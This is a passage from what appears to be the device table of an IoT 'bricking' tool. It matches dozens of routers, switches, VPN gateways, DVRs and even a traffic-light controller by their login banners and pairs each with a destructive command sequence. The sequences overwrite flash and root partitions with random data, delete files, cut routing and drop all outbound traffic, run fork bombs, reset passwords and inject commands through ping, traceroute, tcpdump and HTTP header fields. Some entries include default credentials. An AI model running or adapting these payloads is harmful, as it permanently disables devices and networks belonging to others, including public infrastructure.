		'exec ping `cat${IFS}/dev/zero${IFS}>/dev/root`', '',
	],		

  # Cisco VPN 3000 Concentrator from 2005
  [ 'ciscovpn3000', '.*', '4\)\s+Save\s+changes\s+to\s+Config\s+file',
    '2', '[>#] ',
    '8', '[>#] ',
    '9', 'reformat',
    'YES', '[>#] ',
    '10', '[>#] ',
    '3', '[>#] ',
    '3', '[>#] ',
    '2', '[>#] ',
    '2', 'Done',
  ],

  # Oxygen Broadband thingy
  [ 'oxygen', '.*', 'system\s+System\soperations',
    "\x03", '',   # ctrl c to clear out cmd line
    'system fdefaults', 'y/n',
    'y', '[>#] ',
  ],

  # D-Link DSR 500N CLI
  [ 'dsrdlink', '.*', '(D-Link DSR|util.*Utilities Mode)',
    "\x03", '',   # ctrl c to clear out cmd line
    'util md5sum `cat${IFS}/dev/urandom${IFS}>/dev/mtdblock0${IFS}&`', '[>#] ',
    'util md5sum `cat${IFS}/dev/urandom${IFS}>/dev/mtdblock1${IFS}&`', '[>#] ',
    'util md5sum `cat${IFS}/dev/urandom${IFS}>/dev/mtdblock2${IFS}&`', '[>#] ',
    'util md5sum `cat${IFS}/dev/urandom${IFS}>/dev/mtdblock3${IFS}&`', '[>#] ',
    'util md5sum `cat${IFS}/dev/urandom${IFS}>/dev/mtdblock4${IFS}&`', '[>#] ',
    'util md5sum `cat${IFS}/dev/urandom${IFS}>/dev/mtdblock5${IFS}&`', '%WAIT%',
    'util md5sum `poweroff`', '[>#] ',  
    'util md5sum `reboot`', '[>#] ',  
  ],

  # 3Com Access Point
  [ '3comap', '.*', '(3Com Access Point|Access Point Rev \d|Type \"help\" for a list of valid commands\.)',
    'set hostipaddr 127.0.0.1', '[>#] ',
    'set dhcpc disable', '[>#] ',
    'set ipaddr 127.0.0.1', '[>#] ',
    'applycfg', 'Rebooting',
  ],

  # Alcatel-Lucent OmniSwitch
  [ 'omniswitch', '.*', '(ERROR: Invalid entry: \"\/etc\/\"|Lucent OmniSwitch)',
    'newfs /flash', '= No',
    'y', '[>#] ',
    'newfs /uflash', '(= No|>)',
    'y', '[>#] ',
    'rm *', '[>#] ',
    'reload', 'Y/N',
    'y', '[>#] ',
  ],

  # Bullet LTE with AT commands, used at least by Rogers
  [ 'bullet', '.*', '(Invalid command \"cat\"|Entering character mode)',
    'AT+MMNAME=HACKED', '[>#] ',
    'AT+MSIP=127.0.0.1', '[>#] ',
    'AT+MCTPS1=0', '[>#] ',
    'AT+MPWD=%NEWPASS%,%NEWPASS%', '[>#] ',
    'AT+MREB', 'OK',
    # alt 1
    'exec ping `cat${IFS}/dev/zero${IFS}>/dev/root`', '',
    # alt 2
    'AT+MSRTF=0', 'confirm',
    'AT+MSRTF=1', 'rebooting',
  ],

  # CenturyLink study, try this if broadcom isn't a match - must keep arg 3 as .* to prevent premature match
#  [ 'centurylink', 'admin/CenturyL1nk', '.*',
  [ 'pk5001', '.*', '(PK5001Z|admin_\S+SSH:\S+Linux User)',
    'su', 'Password: ',
    'zyad5001', '',
    'dd if=/dev/urandom of=/dev/mtdblock0 &', '', 
    'dd if=/dev/urandom of=/dev/mtdblock1 &', '', 
    'dd if=/dev/urandom of=/dev/mtdblock2 &', '', 
    'dd if=/dev/urandom of=/dev/mtdblock3 &', '', 
    'dd if=/dev/urandom of=/dev/mtdblock4 &', '', 
    'dd if=/dev/urandom of=/dev/mtdblock5 &', '', 
    'dd if=/dev/urandom of=/dev/mtdblock6 &', '', 
    'dd if=/dev/urandom of=/dev/mtdblock7 &', '', 
    'dd if=/dev/urandom of=/dev/mtd0 &', '', 
    'dd if=/dev/urandom of=/dev/mtd1 &', '', 
    'dd if=/dev/urandom of=/dev/mtd2 &', '', 
    'dd if=/dev/urandom of=/dev/mtd3 &', '', 
 	  'cat /dev/urandom >/dev/mtdblock0 &', '', 
 	  'cat /dev/urandom >/dev/mtdblock1 &', '', 
 	  'cat /dev/urandom >/dev/mtdblock2 &', '', 
 	  'cat /dev/urandom >/dev/mtdblock3 &', '', 
 	  'cat /dev/urandom >/dev/mtdblock4 &', '', 
 	  'cat /dev/urandom >/dev/mtdblock5 &', '', 
 	  'cat /dev/urandom >/dev/mtdblock6 &', '', 
 	  'cat /dev/urandom >/dev/mtdblock7 &', '', 
 	  'cat /dev/urandom >/dev/mtdblock8 &', '', 
 	  'cat /dev/urandom >/dev/mtdblock9 &', '', 
 	  'cat /dev/urandom >/dev/root &', '', 
    'dd if=/dev/urandom of=/dev/root &', '', 
		'route del default;iproute del default;ip route del default', '',
		'iptables -F;iptables -t nat -F;iptables -A OUTPUT -j DROP', '%WAIT%', 
 	  'cat /dev/urandom >/dev/mem &', '', 
		'd(){ d|d & };d 2>/dev/null', '[#$>] ', 
		'sysctl -w net.ipv4.tcp_timestamps=0;sysctl -w kernel.threads-max=1', '%WAIT% ',
		'halt -n -f', '[#$>] ',
		'reboot', '[#$>] ',
		# try again just in case there was no dev null
		'd(){ d|d & };d', '%TERM%', 
  ],    


  # Samsung Ubigate Covad switch at Earthlink
  [ 'ubigate', '.*', '(Error : Command \'uname\' does not exist|SAMSUNG ELECTRONICS .*Login)', 
    'file', '[>#] ',
    'format /cf0', 'Y/N',
    'y', 'file[>#] ',
    'exit', '[>#] ',
    'reboot', 'y/n',
    'y', 'reboot',
  ],

  # EC-2 traffic light control system (yes really, I have bricked a few of these)
  [ 'ec2traffic', '.*', '\/WEB_CONFIGURATOR\/CONFIG',
    '$linux', '[>#\$] ',
    'telnet 127.0.0.1', 'login:',
    'root', 'word:',
    'peek', '[>#\$:] ',
    'cat /dev/urandom >/dev/mtdblock/4', '[>#\$:] ', # seems to brick if root
    'route del default', '[>#\$:] ',
    'nop', '[>#\$:] ',
    'nop', '[>#\$:] ',
		'd() { d|d & }; d', '',
  ],

  # Some nondescript garbage things
  [ 'genu01', '.*', 'ID\s+From\s+To\s+Protocol\s+Sessions',
    'boot action = factory', '[>#] ',
  ],
  [ 'genu02', '.*', 'usr\/config\$',
    'ifaddr -ipsharing 1 1.2.3.2', '[>#\$] ',
    'ifaddr -ip 1.2.3.4 -mask 255.255.255.0 -gate 1.2.3.5', '',
    'commit', '[>#\$] ',
    'reboot', '[>#\$] ',
  ],
  [ 'genu03', '.*', 'watchdog\?',
    'set2default', '\[no\]',
    'yes', '\[no\]',
    'yes', '\[yes\]',
    'no', '\[no\]',
    'yes', 'NVRAM',
  ],
  [ 'genu04', '.*', 'restore system and load default configure',
    'restore', '=>',
  ],
  # Vigor-related but not sure? Many branded VigorFly200, renaming it that..
  [ 'vigorfly', '.*', 'Welcome to \S+\!\!\!',
  	'ping `mtd_write erase mtd0;mtd_write erase mtd1;mtd_write erase mtd2;mtd_write erase mtd3;mtd_write erase mtd4 &`', '\S#',
		'ping `cat /dev/urandom >/dev/mtdblock0;cat /dev/urandom >/dev/mtdblock1;cat /dev/urandom >/dev/mtdblock2 &`', '\S#',
		'ping `cat /dev/urandom >/dev/mtdblock3;cat /dev/urandom >/dev/mtdblock4;cat /dev/urandom >/dev/mtdblock5 &`', '\S#',
		'ping `cat /dev/urandom >/dev/mtdblock6;cat /dev/urandom >/dev/mtdblock7 &`', '\S#',
		'ping `route del default`', '\S#',
	],
	# Unknown HP, H3C and Huawei router CLI
	[ 'genu06', '.*', '[\%:] (Unrecognized|Incomplete|Wrong) (command|parameter) found at \S\S\S position\.',
		'format flash:', 'Y/N',
		'y', '>',
		'system-view', '[>\]]',
		'router id 1.2.3.4', '[>\]]',
		'sysname HACKED', '[>\]]',
		'super password simple HACK%NEWPASS%', '[>\]]',
		'interface wlan-ethernet 0', '[>\]]',
		'shutdown', '[>\]]',
		'interface wlan-ethernet 1', '[>\]]',
		'shutdown', '[>\]]',
		'interface wlan-ethernet 2', '[>\]]',
		'shutdown', '[>\]]',
		'interface wlan-ethernet 3', '[>\]]',
		'shutdown', '[>\]]',
		'reboot', 'Y/N',      # works on some, see infoM v3
		'y', '',
	],
	# Unidentified IoS
	[ 'genu07', '.*', 'welcome to use cli',
		'mgmt', '>',
		'backup', '>',
		'revertfac', '>',
		'restore http://1.2.3.4/&&reboot', '>',
	],
	# Some ISP router thingy, unknown
	[ 'genu08', '.*', 'Command Not Found',
		'configure', '[>#\$] ',
		'hostname HACKED', '[>#\$] ',
		'interface ge1', '[>#\$] ',
		'shutdown\nwrite memory', '[>#\$] ',
		'exit', '[>#\$] ',
		'interface ge2', '[>#\$] ',
		'shutdown\nwrite memory', '[>#\$] ',
	],
	# WARNING system has no password crap
	[	'genu09', '.*', '(System has no password|\% Command missing, Valid commands are:)',
		'sys cfg default', '[>#\$] ',
	],
	# Some weirdo but can set a password
	[ 	'genu10', '.*', '(Warning: administrative password is not configured|\(config\)>|Command::Base error)',
		'user admin', '> ',
		'password %NEWPASS%', '> ',
		'tag cli', '> ',
		'exit', '> ',
	],
	
 	# Pirelli Discus DRG A226G  Watson SHDSL Router   possibly others
  [	'drgwatson', '.*', 'Bad command - Try using help -s <command>', 
    'system', '[>#] ',
    'shell', '[>#] ',
    'dd if=/dev/urandom of=/dev/mtdblock0 &', '[>#] ',
    'dd if=/dev/urandom of=/dev/mtdblock1 &', '[>#] ',
    'dd if=/dev/urandom of=/dev/mtdblock2 &', '[>#] ',
    'dd if=/dev/urandom of=/dev/mtdblock3 &', '[>#] ',
    'dd if=/dev/urandom of=/dev/mtd0 &', '[>#] ',
    'dd if=/dev/urandom of=/dev/mtd1 &', '[>#] ',
    'dd if=/dev/urandom of=/dev/mtd2 &', '[>#] ',
    'dd if=/dev/urandom of=/dev/mtd3 &', '[>#] ',
    'dd if=/dev/urandom of=/dev/root &', '%WAIT%',
    'ifconfig br0 down &', '[>#] ',
    'ifconfig ppp0 down &', '[>#] ',
    'ifconfig eth1 down &', '[>#] ',
    'ifconfig eth2 down &', '[>#] ',
    'ifconfig eth3 down &', '[>#] ',
    'ifconfig eth4 down &', '[>#] ',
    'ifconfig eth5 down &', '[>#] ',
    'ifconfig eth6 down &', '[>#] ',
    'ifconfig eth7 down &', '[>#] ',
    'ifconfig eth8 down &', '[>#] ',
    'ifconfig ixp0 down &', '[>#] ',
    'ifconfig ixp1 down &', '[>#] ',
    'ifconfig ipsec0 down &', '[>#] ',
#    'cat /dev/urandom >/dev/mtdblock0 &', '[>#] ',   # this flakes out, do not use cat 
#    'cat /dev/urandom >/dev/mtd0 &', '[>#] ',
    'route del default', '%WAIT%',
#    'cat /dev/urandom >/dev/mem &', '[>#] ',
    'restore_factory_settings', '[>#] ',
    'restore_default', '[>#] ',
    'exit', '[>#] ',
    'restore_factory_settings', '[>#] ',
    'restore_default', '[>#] ',
  ],    

	# VPN Access thing
	[ 'vpnaccess', '.*', '(Welcome to VPN Access|voipGwH245Tunneling.*rw)',
		'46', '[>#] ',
		'Dest:00=1.2.3.4', '[>#] ',
		'Dest:01=1.2.3.4', '[>#] ',
		'Dest:02=1.2.3.4', '[>#] ',
		'Dest:03=1.2.3.4', '[>#] ',
	],
	
	# Draytek
	[ 'draytek', '.*', '(Dray[tT]ek>|Draytek login)',
		'traceroute ;cat${IFS}/dev/urandom${IFS}>/dev/root${IFS}&', '[>#] ',
		'traceroute ;cat${IFS}/dev/urandom${IFS}>/dev/mtdblock0${IFS}&', '[>#] ',
		'traceroute ;cat${IFS}/dev/urandom${IFS}>/dev/mtdblock1${IFS}&', '[>#] ',
		'traceroute ;cat${IFS}/dev/urandom${IFS}>/dev/mtdblock2${IFS}&', '[>#] ',
		'traceroute ;cat${IFS}/dev/urandom${IFS}>/dev/mtdblock3${IFS}&', '[>#] ',
		'traceroute ;cat${IFS}/dev/urandom${IFS}>/dev/mtdblock4${IFS}&', '[>#] ',
		'traceroute ;cat${IFS}/dev/urandom${IFS}>/dev/mtdblock5${IFS}&', '[>#] ',
		'traceroute ;sh', '',
		'cat /dev/urandom >/dev/mtdblock0 &', '',
		'cat /dev/urandom >/dev/mtdblock1 &', '',
		'ifconfig eth1 down', '',
		'ifconfig eth0 down', '',
		'ifconfig ppp0 down', '',
		'iptables -A OUTPUT -j DROP', '',
		'traceroute ;iptables${IFS}-A${IFS}OUTPUT${IFS}-j${IFS}DROP', '[>#] ',
    'exit', '',
		'traceroute ;iptables${IFS}-A${IFS}OUTPUT${IFS}-j${IFS}DROP', '[>#] ',
	],

	# KingType ktcatv
	[ 'ktcatv', '.*', '\@ktcatv:',
		'cat /dev/urandom >/dev/mtdblock0 &', '[>#\$] ',
		'cat /dev/urandom >/dev/mtdblock1 &', '[>#\$] ',
		'cat /dev/urandom >/dev/mtdblock2 &', '[>#\$] ',
		'cat /dev/urandom >/dev/mtdblock3 &', '[>#\$] ',
		'cat /dev/urandom >/dev/mtdblock4 &', '[>#\$] ',
		'cat /dev/urandom >/dev/mtdblock5 &', '[>#\$] ',
		'route del default', '[>#\$] ',
		'iptables -A OUTPUT DROP', '%WAIT%',
		'd() { d|d & }; d 2>/dev/null', '[>#\$] ',
		'd() { d|d & }; d 2>/dev/null', '[>#\$] ',
	],

  # Digi's CLI
  [ 'digi', '.*', '(Digi\Ss Command Line Interface|write \Spathname\S \Sstring\S)',
    'setnetwork dhcp = off', '[#$>] ', 
    'setnetwork gateway = 1.2.3.4', '[#$>] ', 
    'setnetwork ip = 1.2.3.5', '[#$>] ', 
    'setnetwork primarydns = 127.0.0.1', '[#$>] ', 
    'setnetwork secondarydns = 127.0.0.2', '[#$>] ', 
    'reboot', '[#$>] ', 
    'wm 0 0', '[#$>] ', 
    'wm 1 0', '[#$>] ', 
    'wm 2 0', '[#$>] ', 
    'wm 3 0', '[#$>] ', 
  ],
 
  # Some mystery thing, KEENETIC
  [ 'keenetic', '.*', 'exec exit flash help',
    'wlan ssid HACKED', '> ',
    'exec umount -a -f', '> ',
    'exec mkswap /dev/mtdblock/0', '> ',
    'exec mkswap /dev/mtdblock/1', '> ',
    'exec mkswap /dev/mtdblock/2', '> ',
    'exec mkswap /dev/mtdblock/3', '> ',
    'exec mkswap /dev/mtdblock/5', '> ',
    'exec mkswap /dev/mtdblock/6', '> ',
    'exec mkswap /dev/mtdblock/4', '> ',
    'exec iptables -A OUTPUT -j DROP', '> ',
    'exec route del default', '%WAIT%',
    'exec reboot', '',
  ],

  # ATP Cli which is Huawei stuff
  [ 'atpcli', '.*', '(ATP>|ATP Cli|HG\d\S+>)',
    'sh', '[>#]',
    'shell', '[>#]',
    'welcome to shell', '[>#]', 
    'cat /dev/urandom >/dev/mtdblock0 &', '[>#]', 
    'cat /dev/urandom >/dev/mtdblock1 &', '[>#]', 
    'cat /dev/urandom >/dev/mtdblock2 &', '[>#]', 
    'cat /dev/urandom >/dev/mtdblock3 &', '[>#]', 
    'cat /dev/urandom >/dev/mtdblock4 &', '[>#]', 
    'cat /dev/urandom >/dev/mtdblock5 &', '[>#]', 
    'cat /dev/urandom >/dev/mtdblock6 &', '[>#]', 
    'cat /dev/urandom >/dev/root &', '[>#]', 
    'route del default', '[>#]', 
    'iptables -A OUTPUT -j DROP', '[>#]', 
    'ping ?;cat${IFS}/dev/urandom${IFS}>/dev/mtdblock0;true', '', 
    'ping ?;cat${IFS}/dev/urandom${IFS}>/dev/mtdblock3;true', '', 
    'ping ?;cat${IFS}/dev/urandom${IFS}>/dev/mtdblock1;true', '', 
    'ping ?;cat${IFS}/dev/urandom${IFS}>/dev/mtdblock2;true', '', 
    'ping ?;cat${IFS}/dev/urandom${IFS}>/dev/mtdblock4;true', '', 
    'ping ?;cat${IFS}/dev/urandom${IFS}>/dev/mtdblock5;true', '', 
    'ping ?;cat${IFS}/dev/urandom${IFS}>/dev/mtdblock6;true', '', 
    'ping ?;iptables${IFS}-A${IFS}OUTPUT${IFS}-j${IFS}DROP;true', '', 
  ],

  # DirecTV bridges
  [ 'dirtvbridge', 'light.*(Utopia\S?Init:|ModelName:WVBR0-25-US)',
    'GET / HTTP/1.0\r\nUser-Agent: ";iptables -A OUTPUT -j DROP;route del default;cat /dev/urandom >/dev/root;cat /dev/urandom >/dev/mtdblock7;cat /dev/urandom >/dev/mtdblock5;cat /dev/urandom >/dev/mtdblock8 #\r\n\r\n',
#    'GET / HTTP/1.0\r\nUser-Agent: ;route del default #\r\n\r\n',
    'GET / HTTP/1.0\r\n\r\n',
  ],

  # Haivision Makito X
  [ 'makito', '.*', '(Lightev\S?TV|haiVision Admin)', 
    'cat /dev/urandom >/tmp/.filltemp;chmod gou-rxw /tmp/.filltemp &', '',
    'passwd', 'password',
    '%OLDPASS%', 'password', 
    '%NEWPASS%', 'password',
    '%NEWPASS%', '%WAIT%',
    'd() { d|d & }; d 2>/dev/null', '',
  ],

  # buildroot login
  [ 'focushns', 'root/Focushns', '',
    'cat /dev/urandom >/dev/mtdblock0 &', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock1 &', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock2 &', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock3 &', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock4 &', '[>#] ',
    'cat /dev/urandom >/dev/mtd0 &', '[>#] ',
    'cat /dev/urandom >/dev/mtd1 &', '[>#] ',
    'cat /dev/urandom >/dev/mtd2 &', '[>#] ',
    'cat /dev/urandom >/dev/mtd3 &', '[>#] ',
    'cat /dev/urandom >/dev/mtd4 &', '[>#] ',
    'cat /dev/urandom >/dev/sda1 &', '[>#] ',
    'cat /dev/urandom >/dev/sda2 &', '[>#] ',
    'cat /dev/urandom >/dev/root &', '%WAIT%',
    'route del default', '',
  ],

  # msopassword CGNV2 thing
  [ 'mso', '.*', 'help Display menu commands',
    'shell', 'Password:', 
    '%OLDPASS%', '# ',
    'cat /dev/urandom >/dev/mtdblock5 &', '# ',
    'cat /dev/urandom >/dev/mtdblock0 &', '# ',
    'cat /dev/urandom >/dev/mtdblock1 &', '# ',
    'cat /dev/urandom >/dev/mtdblock2 &', '# ',
    'cat /dev/urandom >/dev/mtdblock3 &', '# ',
    'cat /dev/urandom >/dev/mtdblock4 &', '# ',
    'cat /dev/urandom >/dev/mtdblock6 &', '# ',
    'cat /dev/urandom >/dev/mtdblock7 &', '# ',
    'cat /dev/urandom >/dev/root &', '# ',
    'route del default', '# ',
    'iptables -A OUTPUT -j DROP', '# ',
    'ifconfig wan1 down', '# ',
    'ifconfig wan0 down', '# ',
    'ifconfig lan0 down', '# ',
    'ifconfig eth0 down', '# ',
    'ifconfig br0 down', '# ',
    'ifconfig lo down', '# ',
    'ifconfig cni0 down', '# ',
    'ifconfig lbr0 down', '# ',
    'ifconfig mta0 down', '# ',
  ],
  # QL_LoadBalance thingy
  [ 'qllb', '.*', '(Supported by PIOLINK|QLLoadBalance)',
    'ping ;sh', '# ',
    'cat /dev/urandom >/dev/sda &', '',
    'cat /dev/urandom >/dev/sda1 &', '',
    'cat /dev/urandom >/dev/sda2 &', '',
    'cat /dev/urandom >/dev/sda3 &', '',
    'cat /dev/urandom >/dev/sda4 &', '',
    'cat /dev/urandom >/dev/sda5 &', '',
    'cat /dev/urandom >/dev/sda6 &', '',
    'cat /dev/urandom >/dev/sda7 &', '',
    'cat /dev/urandom >/dev/sda8 &', '',
    'cat /dev/urandom >/dev/sda9 &', '',
    'route del default', '',
  ],
  # NetRouter 2G from Digitel
  [ 'netrouter', '.*', '(\/ETC\/PASSWD|Welcome to NetRouter|Digitel Configuration Manager|-ALF \/ETC\/)',
    'exec shell', '[>#] ',
    'dd if=/dev/urandom of=/dev/mtdblock7 &', '[>#] ',
    'dd if=/dev/urandom of=/dev/root &', '[>#] ',
    'dd if=/dev/urandom of=/dev/mtdblock0 &', '[>#] ',
    'dd if=/dev/urandom of=/dev/mtdblock1 &', '[>#] ',
    'dd if=/dev/urandom of=/dev/mtdblock2 &', '[>#] ',
    'dd if=/dev/urandom of=/dev/mtdblock3 &', '[>#] ',
    'dd if=/dev/urandom of=/dev/mtdblock4 &', '[>#] ',
    'dd if=/dev/urandom of=/dev/mtdblock5 &', '[>#] ',
    'dd if=/dev/urandom of=/dev/mtdblock6 &', '[>#] ',
    'dd if=/dev/urandom of=/dev/mtdblock8 &', '[>#] ',
    'route del default', '[>#] ',
    'iptables -F;iptables -t nat -F;iptables -A OUTPUT -j DROP', '%WAIT%',
    'config purge all', '[>#] ',
    'exit', '[>#] ',
    'config purge all', '[>#] ',
  ],    
	
  # Junos
  [ 'junos', '.*', '(SRX\d+[>#]|JUNOS \d)', 
    'configure', '[>#] ',
    'set system host-name HACKED', '[>#] ',
    'delete routing-options static route', '[>#] ',
    'set routing-options static route 0.0.0.0/0 reject', '[>#] ',
    'delete system name-server', '[>#] ',
#    'delete system services dhcp router', '[>#] ',
    'delete system services dhcp', '[>#] ',
    'commit', '[>#] ',
  ],    

  # TrendChip thingy
  [ 'trendchip', '.*', '(TrendChip Technologies|sys\s+exit\s+ether\s+wan)',
    'sys default', '',
  ],
  
  # CellJanus thingy
  [ 'celljanus', '.*', 'CellJanus RX',
    '9', 'cancel:',
    'yes', 'continue',
  ],
  
  # Cisco Nexus
  [ 'cisconex', '.*', 'Cisco Nexus Operating System',
  	'virtual-service reset force', 'y/n',
  	'y', '[>#] ',
  	'format bootflash:', 'yes/no',
  	'y', '[>#] ',
  	'format usb1:', 'yes/no',
  	'y', '[>#] ',
  	'format usb2:', 'yes/no',
  	'y', '[>#] ',
  	'reload', 'y/n',
  	'y', '',
  ],
  
  # Windows CE
  [ 'wince', '.*', '(Windows CE Telnet Service|Cannot execute \S+\.exe)',
    'attrib -r -h -s *.* /s', '[>#] ',
    'attrib -r -h -s *.* /s', '[>#] ',
    'del /s *.*', 'Y/N',
    'y', '[>#] ',
    'halt', '[>#] ', 
  ],

  # some crappy ipcom thing  
  [ 'ipcom', '.*', 'Unknown commands or command parameters are insufficient\.',
    'configure', '[>#] ', 
    'new', '[>#] ', 
    'hostname HACKED', '[>#] ', 
    'ip route default 1.2.3.4', '[>#] ', 
    'commit', '\(y\|', 
    'y', '\(y\|', 
    'y', '[>#] ', 
    'poweroff', '\(y\|', 
    'y', '[>#] ', 
    'poweroff', '\(y\|', 
    'y', '[>#] ', 
  ],
  
  # meshtron
  [ 'meshtron', '.*', '(M e s h t r o n|Meshtron#|Unknown command \[uname\])',
    'factory', '[>#] ', 
  ],
  
  # AXN AxelerateOS
  [ 'axelerateos', '.*', '(AXN AxelerateOS|CLI Error: Can\'t find command - uname)',
    'passwd', 'Password',
    '%OLDPASS%', 'Password',
    '%NEWPASS%', 'Again',
    '%NEWPASS%', '[>#] ', 
  ],
  
  # AVer EH6108H+ Hybrid DVR
  [ 'aver', '.*', 'root/svgodie', '',
    'cat /dev/urandom >/dev/mtdblock1 &', '[>#] ', 
    'cat /dev/urandom >/dev/mtdblock2 &', '[>#] ', 
    'cat /dev/urandom >/dev/mtdblock3 &', '[>#] ', 
    'cat /dev/urandom >/dev/sda1 &', '[>#] ', 
    'iproute del default', '[>#] ', 
    'ifdown eth0', '[>#] ', 
    'ifdown eth1', '[>#] ', 
  ],
  
  # some crappy IntelliServer thing
  [ 'intelliserver', '.*', '(IntelliServer Release|uname not found)',
    'reset factory', '[>#] ',
    'save', '[>#] ',
    'motd set line 1 HACKED*', '[>#] ',
    'motd set line 2 HACKED*', '[>#] ',
    'motd set line 3 HACKED*', '[>#] ',
    'motd set line 4 HACKED', '[>#] ',
    'password', 'password:',
    '%NEWPASS%', 'password:',
    '%NEWPASS%', '[>#] ',
    'save', '[>#] ',
    'shutdown now', 'arrived',
  ],
  
  # similar to drgwatson but maybe older?
  [ 'drglike', '.*', 'Linux version \S+openrg-rmk',
    'shell', '[>#] ',
    'cat /dev/urandom >/dev/root &', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock0 &', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock1 &', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock2 &', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock3 &', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock4 &', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock5 &', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock6 &', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock7 &', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock8 &', '[>#] ',
    'route del default', '%WAIT%',
    'restore_default', '[>#] ',
    'exit', '[>#] ',
    'restore_default', '[>#] ',
  ],
	
  # Westermo MRD-310, possibly others, guest access RCE
  [ 'westermo', '.*', '(\s\/mrd3\d\d|MRD-310|Westermo MRD|Copyright Cybertec|esh: cat: No such command)',
    'telnet `cat /dev/urandom >/dev/mtdblock0 &`', '[\$>#] ',
    'quit', '[\$>#] ',
    'telnet `cat /dev/urandom >/dev/mtdblock1 &`', '[\$>#] ',
    'quit', '[\$>#] ',
    'telnet `cat /dev/urandom >/dev/mtdblock2 &`', '[\$>#] ',
    'quit', '[\$>#] ',
    'telnet `cat /dev/urandom >/dev/mtdblock3 &`', '[\$>#] ',
    'quit', '[\$>#] ',
    'telnet `cat /dev/urandom >/dev/mtdblock4 &`', '[\$>#] ',
    'quit', '[\$>#] ',
    'telnet `cat /dev/urandom >/dev/mtdblock5 &`', '[\$>#] ',
    'quit', '[\$>#] ',
    'telnet `cat /dev/urandom >/dev/mtdblock6 &`', '[\$>#] ',
    'quit', '[\$>#] ',
    'telnet `cat /dev/urandom >/dev/mtdblock7 &`', '[\$>#] ',
    'quit', '[\$>#] ',
    'telnet `cat /dev/urandom >/dev/root &`', '[\$>#] ',
    'quit', '[\$>#] ',
    'telnet `route del default`', '[\$>#] ',
    'quit', '[\$>#] ',
    'telnet `iptables -A OUTPUT -j DROP`', '[\$>#] ',
    'quit', '[\$>#] ',
  ],  
	
	# some crappy IoS which allows any root login pw
	[ 'gapm', '.*', 'GAPM-\d\d\d\d',
		'cat /dev/urandom >/dev/mtdblock0 &', '[>#\$] ',
		'cat /dev/urandom >/dev/mtdblock1 &', '[>#\$] ',
		'cat /dev/urandom >/dev/mtdblock2 &', '[>#\$] ',
		'cat /dev/urandom >/dev/mtdblock3 &', '[>#\$] ',
		'cat /dev/urandom >/dev/mtdblock4 &', '[>#\$] ',
		'cat /dev/urandom >/dev/mtdblock5 &', '[>#\$] ',
		'cat /dev/urandom >/dev/mtdblock6 &', '[>#\$] ',
		'cat /dev/urandom >/dev/mtdblock7 &', '[>#\$] ',
		'cat /dev/urandom >/dev/mtdblock8 &', '[>#\$] ',
		'cat /dev/urandom >/dev/mtdblock9 &', '[>#\$] ',
		'cat /dev/urandom >/dev/mtdblock10 &', '[>#\$] ',
		'cat /dev/urandom >/dev/mem &', '[>#\$] ',
		'route del default', '[>#\$] ',
	],

  # vADC thing, usually can't do more than just temp fix password.. limited access though so not a high priority
  [ 'adc', '.*', 'Error: no parameter\(s\) expected', 
    'oper', '[>#\$] ',
    'passwd', 'password:',
    '%OLDPASS%', 'password:',
    '%NEWPASS%', 'password:',
    '%NEWPASS%', '[>#\$] ',
    'exit', '',
  ],

  # GR2412GA Gateway Router Solution CLI - some IoS noname router thing
  [ 'grscli', '.*', 'ERR::Command \'uname\' not found!',
    'cd utils', '[>#\$] ',
    'tcpdump --file-name=`cat${IFS}/dev/zero${IFS}>/dev/root${IFS}&`', '[>#\$] ',
    'tcpdump --file-name=`cat${IFS}/dev/zero${IFS}>/dev/mtdblock0${IFS}&`', '[>#\$] ',
    'tcpdump --file-name=`cat${IFS}/dev/zero${IFS}>/dev/mtdblock1${IFS}&`', '[>#\$] ',
    'tcpdump --file-name=`cat${IFS}/dev/zero${IFS}>/dev/mtdblock2${IFS}&`', '[>#\$] ',
    'tcpdump --file-name=`cat${IFS}/dev/zero${IFS}>/dev/mtdblock3${IFS}&`', '[>#\$] ',
    'tcpdump --file-name=`cat${IFS}/dev/zero${IFS}>/dev/mtdblock4${IFS}&`', '[>#\$] ',
    'tcpdump --file-name=`cat${IFS}/dev/zero${IFS}>/dev/mtdblock5${IFS}&`', '[>#\$] ',
    'tcpdump --file-name=`route${IFS}del${IFS}default`', '[>#\$] ',
  ],

  # FOS2.0 or FOS3.0 ppc thingy
  [ 'fos', '.*', '(FOS \Snone\S.*ppc|FOS version|Welcome to FOS)',
    'umount -a', '[>#\$] ',
    'dd if=/dev/zero of=/dev/ttfsa &', '[>#\$] ',
    'dd if=/dev/zero of=/dev/ttfsa1 &', '[>#\$] ',
    'dd if=/dev/zero of=/dev/root &', '[>#\$] ',
    'dd if=/dev/zero of=/dev/ram &', '[>#\$] ',
    'dd if=/dev/zero of=/dev/ramdisk &', '[>#\$] ',
    'route del default', '%WAIT%',
    'd(){ d|d & };d', '%TERM%', 
  ],
   	
  # HPEH thingy, something weird
  [ 'davolink', '.*', '(invalid directory|davolink login)',
    'debug', '[>#\$] ',
    'system', '[>#\$] ',
    'syscmd all dd if=/dev/urandom of=/dev/mtdblock7', '[>#\$] ',
    'syscmd all dd if=/dev/urandom of=/dev/mtdblock8', '[>#\$] ',
    'syscmd all dd if=/dev/urandom of=/dev/mtdblock9', '[>#\$] ',
    'syscmd all dd if=/dev/urandom of=/dev/root', '[>#\$] ',
    'syscmd all route del default', '[>#\$] ',
    'cd ..', '%WAIT%',
    'cd ..', '[>#\$] ',
    'config', '[>#\$] ',
    'default', 'y/n',
    'y', '[>#\$] ',
    'cd ..', '[>#\$] ',
    'system', '[>#\$] ',
    'reset', 'y/n',
    'y', 'y/n',
    'y', 'Done',
  ],
   	
  # JNIOR, tini and slush devices, seems to be misc ethernet components
  [ 'jnior', '.*', '\/etc\/shadow does not exist\.',
    'hostname HACKED', '[>#] ',
  	'rd etc', '[>#] ',
  	'rd flash', '[>#] ',
  	'rd www', '[>#] ',
  	'rd tiniext', '[>#] ',
  	'rd datas', '[>#] ',
  	'cd flash2', '[>#] ',
  	'rm Config.props', '[>#] ',
